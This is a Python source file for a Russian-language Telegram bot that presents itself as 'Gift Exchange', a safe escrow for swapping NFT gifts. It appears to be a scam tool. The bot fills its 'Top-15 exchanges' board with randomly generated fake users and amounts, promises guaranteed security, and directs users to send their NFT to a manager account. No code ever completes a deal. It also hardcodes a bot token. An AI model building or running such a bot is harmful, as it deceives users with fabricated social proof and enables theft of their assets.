# NFT Exchange Bot для iPhone
# ФИНАЛЬНАЯ ВЕРСИЯ - ИСПРАВЛЕННАЯ

import requests
import time
import uuid
import random
from datetime import datetime

# ===== НАСТРОЙКИ =====
TOKEN = "8487741416:AAG6Xw4qmvMJTGZZYlnpFr_0VdAh6MdT4LM"
ADMIN_ID = 174415647
SUPPORT = "GiftExchangersSupport"
MANAGER = "GiftExchangersManager"
BOT_USERNAME = "GiftExchangersBot"

# ===== ХРАНИЛИЩЕ ДАННЫХ =====
deals = {}
top_deals = []
users = {}
banned_users = set()
user_states = {}
user_temp = {}
processed_updates = set()  # 🛡️ Защита от дублей на уровне update_id

settings = {
    "min_amount": 100,
    "max_amount": 300,
    "banner_text": (
        "👋 Приветствуем в проекте «Gift Exchange».\n\n"
        "🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n"
        "👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:"
    )
}

# ===== КЛАВИАТУРЫ =====
def main_keyboard():
    return {
        "keyboard": [
            [{"text": "📝 Создать сделку"}],
            [{"text": "❓ Как происходит сделка"}, {"text": "ℹ️ Информация"}],
            [{"text": "📞 Техподдержка"}, {"text": "🏆 Топ-15 обменов"}]
        ],
        "resize_keyboard": True
    }

def admin_inline_buttons():
    """Возвращает список кнопок (не обёрнутый в словарь)."""
    return [
        [{"text": "📊 Статистика", "callback_data": "admin_stats"}],
        [{"text": "📢 Рассылка", "callback_data": "admin_broadcast"}],
        [{"text": "🚫 Забанить", "callback_data": "admin_ban"}],
        [{"text": "✅ Разбанить", "callback_data": "admin_unban"}],
        [{"text": "📝 Баннер", "callback_data": "admin_banner"}],
        [{"text": "💰 Лимиты", "callback_data": "admin_limits"}],
        [{"text": "📋 Сделки", "callback_data": "admin_deals"}],
        [{"text": "🔄 Обновить топ", "callback_data": "admin_refresh_top"}],
        [{"text": "❌ Закрыть", "callback_data": "admin_close"}]
    ]

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def answer_callback(callback_id, text=None):
    """Обязательно подтверждаем нажатие кнопки — иначе она 'крутится' вечно."""
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id}
    if text:
        data["text"] = text
        data["show_alert"] = False
    try:
        requests.post(url, json=data)
    except:
        pass

def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        data["reply_markup"] = keyboard
    try:
        response = requests.post(url, json=data)
        return response.json() if response.status_code == 200 else None
    except:
        return None

def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
    """buttons — список списков кнопок (inline_keyboard)."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "reply_markup": {"inline_keyboard": buttons},
        "parse_mode": parse_mode
    }
    try:
        response = requests.post(url, json=data)
        return response.json() if response.status_code == 200 else None
    except:
        return None

def edit_message(chat_id, message_id, text, buttons=None, parse_mode="HTML"):
    """buttons — список списков кнопок (inline_keyboard)."""
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    data = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if buttons:
        data["reply_markup"] = {"inline_keyboard": buttons}
    try:
        requests.post(url, json=data)
    except:
        pass

# ===== МАСКИРОВКА USERNAME =====
def mask_username(username):
    """Замазываем середину ника: @Alice23 → @Al***23"""
    name = username.replace('@', '')
    if len(name) <= 3:
        stars = '*' * len(name)
        return f"@{stars}"
    visible = max(2, len(name) // 3)
    stars = '*' * (len(name) - visible * 2)
    return f"@{name[:visible]}{stars}{name[-visible:]}"

def generate_top_15():
    names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack"]
    top = []
    for _ in range(15):
        amount = random.randint(100, 400)
        u1 = f"@{random.choice(names)}{random.randint(10, 99)}"
        u2 = f"@{random.choice(names)}{random.randint(10, 99)}"
        top.append({
            'user1': u1,
            'user2': u2,
            'amount': amount,
            'date': datetime.now().strftime("%Y-%m-%d")
        })
    top.sort(key=lambda x: x['amount'], reverse=True)
    return top

# ===== ОБРАБОТКА СООБЩЕНИЙ =====
def handle_message(message):
    global top_deals  # объявляем в начале функции
    chat_id = message['chat']['id']
    text = message.get('text', '')
    user_id = message['from']['id']
    username = message['from'].get('username', 'NoUsername')
    first_name = message['from'].get('first_name', 'Пользователь')

    # 🚫 Проверка бана
    if user_id in banned_users:
        send_message(chat_id, "🚫 Вы забанены в боте.")
        return

    # 👤 Регистрация пользователя
    if user_id not in users:
        users[user_id] = {'username': username, 'first_name': first_name, 'chat_id': chat_id}
    else:
        # Обновляем chat_id и username на случай изменений
        users[user_id]['chat_id'] = chat_id
        users[user_id]['username'] = username

    # ══════════════════════════════════════
    # 👑 ADMIN СОСТОЯНИЯ — проверяем первыми
    # ══════════════════════════════════════
    if user_id == ADMIN_ID and user_id in user_states:
        admin_state = user_states[user_id]

        if admin_state == 'admin_broadcast':
            del user_states[user_id]
            sent = 0
            for uid, udata in users.items():
                if uid != ADMIN_ID:
                    try:
                        send_message(udata['chat_id'], f"📢 <b>РАССЫЛКА:</b>\n\n{text}")
                        sent += 1
                        time.sleep(0.05)
                    except:
                        pass
            send_message(chat_id, f"✅ Отправлено: {sent} пользователям")
            return

        if admin_state == 'admin_ban':
            del user_states[user_id]
            target = text.replace('@', '').strip()
            found = False
            for uid, udata in users.items():
                if udata.get('username') == target or str(uid) == target:
                    banned_users.add(uid)
                    send_message(chat_id, f"🚫 @{target} забанен")
                    found = True
                    break
            if not found:
                send_message(chat_id, "❌ Пользователь не найден")
            return

        if admin_state == 'admin_unban':
            del user_states[user_id]
            target = text.replace('@', '').strip()
            found = False
            for uid in list(banned_users):
                udata = users.get(uid, {})
                if udata.get('username') == target or str(uid) == target:
                    banned_users.remove(uid)
                    send_message(chat_id, f"✅ @{target} разбанен")
                    found = True
                    break
            if not found:
                send_message(chat_id, "❌ Пользователь не найден в списке банов")
            return

        if admin_state == 'admin_banner':
            del user_states[user_id]
            settings['banner_text'] = text
            send_message(chat_id, "✅ Баннер обновлён!")
            return

        if admin_state == 'admin_limits':
            del user_states[user_id]
            try:
                parts = text.replace('$', '').replace(' ', '').split('-')
                if len(parts) == 2:
                    mn, mx = int(parts[0]), int(parts[1])
                    if mn >= mx:
                        send_message(chat_id, "❌ Минимум должен быть меньше максимума")
                        return
                    settings['min_amount'] = mn
                    settings['max_amount'] = mx
                    send_message(chat_id, f"✅ Лимиты установлены: ${mn} – ${mx}")
                else:
                    send_message(chat_id, "❌ Формат: мин-макс (например 100-300)")
            except ValueError:
                send_message(chat_id, "❌ Введите числа. Формат: 100-300")
            return

    # ══════════════════════════════════════
    # 📌 КОМАНДЫ И МЕНЮ
    # ══════════════════════════════════════

    if text == '/start' or text.startswith('/start ') and 'deal_' not in text:
        send_message(chat_id, settings['banner_text'], main_keyboard())
        return

    # 🔗 Ссылка на сделку: /start deal_XXXX
    if text.startswith('/start deal_'):
        deal_id = text.replace('/start deal_', '').strip()
        if deal_id in deals:
            deal = deals[deal_id]
            status_map = {'waiting': '⏳ Ожидает', 'in_progress': '🔄 В процессе', 'cancelled': '❌ Отменена', 'done': '✅ Завершена'}
            deal_info = (
                f"🔍 <b>СДЕЛКА #{deal_id}</b>\n\n"
                f"👤 <b>Создатель:</b> @{deal['creator_name']}\n"
                f"👤 <b>Участник:</b> @{deal['second_user']}\n"
                f"💰 <b>Сумма:</b> ${deal['amount']}\n"
                f"📊 <b>Статус:</b> {status_map.get(deal['status'], deal['status'])}\n\n"
                f"🎁 <b>NFT создателя:</b> {deal['my_nft']}\n"
                f"🎁 <b>NFT участника:</b> {deal['his_nft']}"
            )
            if deal['status'] == 'waiting':
                send_inline_keyboard(chat_id, deal_info, [[{"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"}]])
            else:
                send_message(chat_id, deal_info)
        else:
            send_message(chat_id, "❌ Сделка не найдена!", main_keyboard())
        return

    if text == "ℹ️ Информация":
        info_text = (
            "📦 <b>О проекте Gift Exchange</b>\n\n"
            "Наш проект создан для безопасного обмена NFT подарками среди пользователей Telegram.\n\n"
            "➕ <b>Преимущества:</b>\n"
            "• ⚡ Быстрые и безопасные обмены\n"
            "• 🕐 Техподдержка 24/7\n"
            "• 🔒 Гарантия безопасности каждой сделки\n"
            "• 🕵️ Конфиденциальность данных\n"
            "• 🖥️ Интуитивный интерфейс\n\n"
            f"📞 <b>Менеджер:</b> @{MANAGER}"
        )
        send_inline_keyboard(chat_id, info_text, [[
            {"text": "❓ Как происходит сделка", "callback_data": "how_deal"},
            {"text": "🏠 Главное меню", "callback_data": "main_menu"}
        ]])
        return

    if text == "❓ Как происходит сделка":
        send_message(chat_id, _how_deal_text())
        return

    if text == "📞 Техподдержка":
        support_text = (
            f"📞 <b>Техническая поддержка</b>\n\n"
            f"💬 <b>Поддержка:</b> @{SUPPORT}\n"
            f"👔 <b>Менеджер:</b> @{MANAGER}\n\n"
            "Напишите им в личные сообщения для получения помощи!"
        )
        send_message(chat_id, support_text, main_keyboard())
        return

    if text == "🏆 Топ-15 обменов":
        if not top_deals:
            top_deals = generate_top_15()
        top_text = "🏆 <b>ТОП-15 ЛУЧШИХ ОБМЕНОВ</b>\n\n"
        for i, deal in enumerate(top_deals[:15], 1):
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
            top_text += f"{medal} {mask_username(deal['user1'])} ↔ {mask_username(deal['user2'])} — <b>${deal['amount']}</b>\n"
        send_message(chat_id, top_text)
        return

    # 📝 СОЗДАНИЕ СДЕЛКИ
    if text == "📝 Создать сделку":
        user_states[user_id] = 'waiting_username'
        user_temp[user_id] = {}
        send_message(chat_id, "👤 <b>Введите @username второго участника сделки:</b>")
        return

    # ══════════════════════════════════════
    # 🔄 ПОЛЬЗОВАТЕЛЬСКИЕ СОСТОЯНИЯ
    # ══════════════════════════════════════
    if user_id in user_states:
        state = user_states[user_id]

        if state == 'waiting_username':
            second_user = text.replace('@', '').strip()
            if not second_user:
                send_message(chat_id, "❌ Введите корректный @username")
                return
            if second_user == username:
                send_message(chat_id, "❌ Нельзя создать сделку с самим собой!")
                return
            user_temp[user_id]['second_user'] = second_user
            user_states[user_id] = 'waiting_my_nft'
            send_message(chat_id, "🎁 <b>Введите ссылку на ВАШУ NFT (которую отдаёте):</b>")
            return

        if state == 'waiting_my_nft':
            user_temp[user_id]['my_nft'] = text
            user_states[user_id] = 'waiting_his_nft'
            send_message(chat_id, "🎁 <b>Введите ссылку на ЕГО NFT (которую получаете):</b>")
            return

        if state == 'waiting_his_nft':
            user_temp[user_id]['his_nft'] = text
            user_states[user_id] = 'waiting_amount'
            send_message(chat_id, f"💰 <b>Введите сумму сделки в USD\n(от ${settings['min_amount']} до ${settings['max_amount']}):</b>")
            return

        if state == 'waiting_amount':
            try:
                amount = float(text.replace('$', '').replace(',', '').strip())
            except ValueError:
                send_message(chat_id, "❌ <b>Введите число.</b> Например: 150")
                return

            if amount < settings['min_amount']:
                send_message(chat_id, f"❌ Минимальная сумма: <b>${settings['min_amount']}</b>")
                return
            if amount > settings['max_amount']:
                send_message(chat_id, f"❌ Максимальная сумма: <b>${settings['max_amount']}</b>")
                return

            deal_id = str(uuid.uuid4())[:8].upper()
            second_user = user_temp[user_id]['second_user']
            my_nft = user_temp[user_id]['my_nft']
            his_nft = user_temp[user_id]['his_nft']

            deals[deal_id] = {
                'creator_id': user_id,
                'creator_name': username,
                'second_user': second_user,
                'my_nft': my_nft,
                'his_nft': his_nft,
                'amount': amount,
                'status': 'waiting',
                'created_at': datetime.now().strftime("%Y-%m-%d %H:%M"),
                'participant_id': None
            }

            deal_text = (
                f"✅ <b>СДЕЛКА СОЗДАНА!</b>\n\n"
                f"🆔 <b>Номер:</b> <code>{deal_id}</code>\n"
                f"👤 <b>Создатель:</b> @{username}\n"
                f"👤 <b>Участник:</b> @{second_user}\n\n"
                f"🎁 <b>Ваша NFT:</b> {my_nft}\n"
                f"🎁 <b>Его NFT:</b> {his_nft}\n"
                f"💰 <b>Сумма:</b> ${amount:.0f}\n\n"
                f"🔗 <b>Ссылка:</b>\n"
                f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
            )

            send_inline_keyboard(chat_id, deal_text, [[
                {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"},
                {"text": "❌ Отменить", "callback_data": f"cancel_{deal_id}"}
            ]])

            # 🔔 Уведомление второму участнику (если он уже в боте)
            for uid, udata in users.items():
                if udata.get('username') == second_user:
                    notify_text = (
                        f"🔔 <b>ВАС ПРИГЛАСИЛИ К ОБМЕНУ!</b>\n\n"
                        f"Пользователь @{username} создал сделку с вами!\n\n"
                        f"🆔 <b>Номер:</b> <code>{deal_id}</code>\n"
                        f"💰 <b>Сумма:</b> ${amount:.0f}\n\n"
                        f"🔗 https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                    )
                    send_inline_keyboard(udata['chat_id'], notify_text, [[
                        {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"}
                    ]])
                    break

            del user_states[user_id]
            del user_temp[user_id]
            return

    # 👑 ADMIN команды
    if text == '/admin' and user_id == ADMIN_ID:
        admin_text = (
            f"👑 <b>ПАНЕЛЬ АДМИНИСТРАТОРА</b>\n\n"
            f"📌 Сделок: <b>{len(deals)}</b>\n"
            f"👥 Пользователей: <b>{len(users)}</b>\n"
            f"🚫 Забанено: <b>{len(banned_users)}</b>\n"
            f"💰 Лимиты: <b>${settings['min_amount']} – ${settings['max_amount']}</b>"
        )
        send_inline_keyboard(chat_id, admin_text, admin_inline_buttons())
        return

# ===== ТЕКСТЫ (вынесены, чтобы не дублироваться) =====
def _how_deal_text():
    return (
        "❓ <b>Как происходит сделка в Gift Exchange?</b>\n\n"
        "🤝 Продавец и покупатель обговаривают условия сделки\n\n"
        f"🤖 Один участник создаёт сделку через @{BOT_USERNAME}\n\n"
        "📲 Второй участник принимает сделку по ссылке\n\n"
        f"📦 Первый участник передаёт NFT менеджеру @{MANAGER}\n\n"
        "✅ Техподдержка подтверждает получение NFT\n\n"
        "🔁 Вторая сторона передаёт свою NFT\n\n"
        "🎉 Менеджер передаёт NFT первому участнику — сделка завершена!"
    )

# ===== ОБРАБОТКА КНОПОК =====
def handle_callback(callback):
    global top_deals  # объявляем в самом начале функции
    callback_id = callback['id']
    chat_id = callback['message']['chat']['id']
    message_id = callback['message']['message_id']
    data = callback['data']
    user_id = callback['from']['id']
    username = callback['from'].get('username', 'NoUsername')

    # ✅ Всегда подтверждаем нажатие кнопки
    answer_callback(callback_id)

    # ── Принять сделку ──
    if data.startswith('accept_'):
        deal_id = data.replace('accept_', '')
        if deal_id not in deals:
            edit_message(chat_id, message_id, "❌ Сделка не найдена!")
            return
        deal = deals[deal_id]
        if deal['status'] != 'waiting':
            edit_message(chat_id, message_id, "⚠️ Сделка уже недоступна!")
            return
        if user_id == deal['creator_id']:
            edit_message(chat_id, message_id, "❌ Нельзя принять свою собственную сделку!")
            return
        if username != deal['second_user']:
            edit_message(chat_id, message_id, "🔒 Эта сделка создана для другого пользователя!")
            return

        deal['participant_id'] = user_id
        deal['participant_name'] = username
        deal['status'] = 'in_progress'

        # 🏆 Добавляем в топ
        top_deals.append({
            'user1': f"@{deal['creator_name']}",
            'user2': f"@{username}",
            'amount': deal['amount'],
            'date': datetime.now().strftime("%Y-%m-%d")
        })
        top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]

        # Уведомление создателю
        send_message(
            deal['creator_id'],
            f"🎉 @{username} принял вашу сделку!\n\n"
            f"📦 Пожалуйста, передайте NFT менеджеру @{MANAGER}"
        )
        # Ответ принявшему
        edit_message(
            chat_id, message_id,
            f"✅ <b>Вы приняли сделку #{deal_id}</b>\n\n"
            f"⏳ Ожидайте — создатель сделки передаст NFT менеджеру @{MANAGER}"
        )
        return

    # ── Отменить сделку ──
    if data.startswith('cancel_'):
        deal_id = data.replace('cancel_', '')
        if deal_id in deals:
            deal = deals[deal_id]
            if deal['creator_id'] != user_id:
                edit_message(chat_id, message_id, "🔒 Только создатель может отменить сделку!")
                return
            if deal['status'] != 'waiting':
                edit_message(chat_id, message_id, "⚠️ Сделку нельзя отменить — она уже активна или завершена!")
                return
            deal['status'] = 'cancelled'
            edit_message(chat_id, message_id, f"❌ <b>Сделка #{deal_id} отменена.</b>")
        return

    # ── Главное меню ──
    if data == "main_menu":
        send_message(chat_id, settings['banner_text'], main_keyboard())
        return

    # ── Как происходит сделка ──
    if data == "how_deal":
        send_message(chat_id, _how_deal_text())
        return

    # ══════════════════════════════════════
    # 👑 ADMIN CALLBACKS
    # ══════════════════════════════════════
    if user_id != ADMIN_ID:
        return

    if data == "admin_stats":
        waiting = sum(1 for d in deals.values() if d['status'] == 'waiting')
        active = sum(1 for d in deals.values() if d['status'] == 'in_progress')
        done = sum(1 for d in deals.values() if d['status'] == 'done')
        cancelled = sum(1 for d in deals.values() if d['status'] == 'cancelled')
        stats = (
            f"📊 <b>СТАТИСТИКА</b>\n\n"
            f"📌 Всего сделок: <b>{len(deals)}</b>\n"
            f"  ⏳ Ожидают: {waiting}\n"
            f"  🔄 В процессе: {active}\n"
            f"  ✅ Завершено: {done}\n"
            f"  ❌ Отменено: {cancelled}\n\n"
            f"👥 Пользователей: <b>{len(users)}</b>\n"
            f"🚫 Забанено: <b>{len(banned_users)}</b>\n"
            f"🏆 В топ-15: <b>{len(top_deals)}</b>"
        )
        edit_message(chat_id, message_id, stats, admin_inline_buttons())
        return

    if data == "admin_broadcast":
        user_states[user_id] = 'admin_broadcast'
        edit_message(chat_id, message_id, "📢 <b>Введите текст рассылки:</b>")
        return

    if data == "admin_ban":
        user_states[user_id] = 'admin_ban'
        edit_message(chat_id, message_id, "🚫 <b>Введите @username или ID для бана:</b>")
        return

    if data == "admin_unban":
        user_states[user_id] = 'admin_unban'
        edit_message(chat_id, message_id, "✅ <b>Введите @username или ID для разбана:</b>")
        return

    if data == "admin_banner":
        user_states[user_id] = 'admin_banner'
        edit_message(chat_id, message_id, "📝 <b>Введите новый текст баннера:</b>")
        return

    if data == "admin_limits":
        user_states[user_id] = 'admin_limits'
        edit_message(chat_id, message_id,
            f"💰 <b>Текущие лимиты: ${settings['min_amount']} – ${settings['max_amount']}</b>\n\n"
            "Введите новые в формате: <code>мин-макс</code>\nНапример: <code>100-500</code>")
        return

    if data == "admin_deals":
        if not deals:
            edit_message(chat_id, message_id, "📭 Сделок пока нет.", admin_inline_buttons())
            return
        status_icons = {'waiting': '⏳', 'in_progress': '🔄', 'cancelled': '❌', 'done': '✅'}
        text = "📋 <b>ВСЕ СДЕЛКИ:</b>\n\n"
        for deal_id, deal in list(deals.items())[:10]:
            icon = status_icons.get(deal['status'], '❔')
            text += f"{icon} <code>{deal_id}</code>: @{deal['creator_name']} → @{deal['second_user']} (${deal['amount']:.0f})\n"
        if len(deals) > 10:
            text += f"\n...и ещё {len(deals) - 10} сделок"
        edit_message(chat_id, message_id, text, admin_inline_buttons())
        return

    if data == "admin_refresh_top":
        top_deals = generate_top_15()
        text = "🔄 <b>ТОП-15 ОБНОВЛЁН:</b>\n\n"
        for i, deal in enumerate(top_deals[:15], 1):
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
            text += f"{medal} {mask_username(deal['user1'])} ↔ {mask_username(deal['user2'])} — <b>${deal['amount']}</b>\n"
        edit_message(chat_id, message_id, text, admin_inline_buttons())
        return

    if data == "admin_close":
        send_message(chat_id, settings['banner_text'], main_keyboard())
        return

# ===== ЗАПУСК =====
def main():
    print("🚀 NFT Exchange Bot запущен!")
    global top_deals
    print(f"🤖 @{BOT_USERNAME}  |  👑 Admin ID: {ADMIN_ID}")

    top_deals = generate_top_15()
    print(f"🏆 Топ-15 сгенерирован ({len(top_deals)} записей)")

    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            response = requests.get(url, params={"offset": offset, "timeout": 30})

            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    for update in data['result']:
                        update_id = update['update_id']
                        offset = update_id + 1

                        # 🛡️ Защита от повторной обработки
                        if update_id in processed_updates:
                            continue
                        processed_updates.add(update_id)
                        # Чистим старые ID (храним последние 1000)
                        if len(processed_updates) > 1000:
                            processed_updates.clear()

                        if 'message' in update:
                            handle_message(update['message'])
                        elif 'callback_query' in update:
                            handle_callback(update['callback_query'])

            time.sleep(0.3)

        except KeyboardInterrupt:
            print("\n🛑 Бот остановлен")
            break
        except Exception as e:
            print(f"⚠️ Ошибка: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
